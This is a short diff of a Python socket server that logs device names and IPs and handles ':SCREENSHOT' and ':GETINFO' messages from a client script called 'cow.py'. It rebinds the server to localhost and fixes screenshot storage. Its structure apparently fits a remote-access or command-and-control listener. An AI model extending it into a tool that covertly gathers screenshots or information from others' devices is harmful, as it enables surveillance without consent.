@@ -1,7 +1,7 @@
 import socket
 
 # Server will listen on all interfaces at this port
-ip = '0.0.0.0'
+ip = '127.0.0.1'
 port = 4570
 
 # Store seen device names and IPs
@@ -64,15 +64,15 @@ while True:
 
     # ========== Handle :SCREENSHOT ==========
     elif msg.startswith(":SCREENSHOT"):
-        link = lines[1] #link
+            link = lines[2]           # Screenshot URL
+            name = lines[1]           # Device name — make sure cow.py sends this!
 
-        print(f"\n[>] Received SCREENSHOT from {name}.")
-        print(link)
+            print(f"\n[>] Received SCREENSHOT from {name}.")
+            print(link)
 
-        # Store the response in the buffer for later retrieval
-        if link not in response_buffer:
-            response_buffer[link] = {}
-        response_buffer[link]["GETSCREENSHOT"] = link
+            if name not in response_buffer:
+                response_buffer[name] = {}
+            response_buffer[name]["GETSCREENSHOT"] = link
 
     # ========== Handle :GETINFO ==========
     elif msg.startswith(":GETINFO"):
